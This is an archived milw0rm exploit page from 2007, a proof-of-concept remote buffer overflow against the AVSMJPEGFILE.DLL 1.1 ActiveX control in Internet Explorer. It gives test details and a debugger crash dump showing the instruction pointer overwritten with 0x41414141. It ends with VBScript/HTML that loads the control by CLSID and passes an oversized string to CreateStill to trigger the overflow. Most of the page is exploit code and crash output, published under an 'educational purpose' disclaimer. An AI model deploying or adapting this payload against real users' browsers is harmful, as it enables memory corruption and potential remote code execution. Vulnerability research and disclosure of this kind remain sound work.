<html><head><title>Online Media Technologies AVSMJPEGFILE.DLL 1.1 Remote BoF PoC</title></head><pre>&lt;pre&gt;
&lt;code&gt;&lt;span style=&quot;font: 10pt Courier New;&quot;&gt;&lt;span class=&quot;general1-symbol&quot;&gt;&lt;body bgcolor=&quot;#E0E0E0&quot;&gt;-------------------------------------------------------------------------------
 &lt;b&gt;Online Media Technologies AVSMJPEGFILE.DLL 1.1 Remote Buffer Overflow&lt;/b&gt;
 url: www.avsmedia.com

 Author: shinnai
 mail: shinnai[at]autistici[dot]org
 site: http://shinnai.altervista.org

 &lt;b&gt;&lt;font color='red'&gt;This was written for educational purpose. Use it at your own risk.
 Author will be not responsible for any damage.&lt;/font&gt;&lt;/b&gt;

 &lt;b&gt;Technical details:
 File: AVSMJPEGFILE.DLL
 Ver.: 1.1.1.102&lt;/b&gt;

 Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
 &lt;b&gt;Remote execution depends on Internet Explorer settings&lt;/b&gt;

 faultmon dump:
 09:58:13.236  pid=13E4 tid=145C  EXCEPTION (first-chance)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION writing [41414141])
              ----------------------------------------------------------------
              EAX=02A31C64: 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00
              EBX=00001C4A: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ECX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDX=00001448: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ESP=0188C9A4: A0 3F 9B 02 41 41 41 41-41 41 41 41 41 41 41 41
              EBP=0188EE08: 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41
              ESI=00000A25: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDI=029B3FA0: 41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00
              EIP=02BF3604: 89 01 E8 0F D6 03 00 83-C4 04 33 C0 8D A5 EC F7
                            --&gt; MOV [ECX],EAX
              ----------------------------------------------------------------

09:58:13.252  pid=13E4 tid=145C  EXCEPTION (first-chance)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION reading [41414141])
              ----------------------------------------------------------------
              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ECX=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDX=7C9137D8: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00
              ESP=0188C5D4: BF 37 91 7C BC C6 88 01-80 F2 88 01 D8 C6 88 01
              EBP=0188C5F4: A4 C6 88 01 8B 37 91 7C-BC C6 88 01 80 F2 88 01
              ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EIP=41414141: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
                            --&gt; N/A
              ----------------------------------------------------------------
-------------------------------------------------------------------------------
&lt;object classid='clsid:4CF945DB-7D52-437B-AD30-185336B44C74' id='test'&gt;&lt;/object&gt;

&lt;input language=VBScript onclick=tryMe() type=button value='Click here to start the test'&gt;

&lt;script language='vbscript'&gt;
 Sub tryMe
  buff = String(3620, &quot;A&quot;)
  test.CreateStill buff, 1, True
 End Sub
&lt;/script&gt;
&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

# milw0rm.com [2007-12-11]</pre></html>